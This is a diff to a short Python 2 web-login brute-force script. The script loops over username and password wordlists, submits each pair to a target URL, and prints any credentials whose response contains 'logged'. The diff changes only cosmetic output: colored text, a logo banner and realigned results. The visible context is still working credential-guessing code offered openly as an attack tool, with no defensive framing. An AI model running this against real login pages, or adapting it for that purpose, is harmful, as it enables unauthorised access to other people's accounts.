@@ -1,6 +1,7 @@
 #!/usr/bin/python -tt
 import urllib
 import sys
+import termcolor
 
 def get(baseurl,usernames,passwords):
      for u in usernames:
@@ -9,7 +10,7 @@ def get(baseurl,usernames,passwords):
              encoded_args=urllib.urlencode(data)
              op = urllib.urlopen(baseurl+encoded_args)
              if 'logged' in op.read():
-                 print "\nUser = "+u.ljust(20)+"Password = "+p.ljust(20)
+                 print "\nUser = "+u.ljust(20)+"Password = ".rjust(20)+p
 
 
 def post(baseurl,usernames,passwords):
@@ -28,7 +29,7 @@ def main():
         passwords = open(sys.argv[5],'r').read().split('\n')
         baseurl=sys.argv[1]+'?'
 
-        print "STARTING BRUTE FORCE ATTACK".center(50,"*")
+        print termcolor.colored((open('logo.txt','r').read()),'red')
     
         if sys.argv[6]=='GET':
             get(baseurl,usernames,passwords)
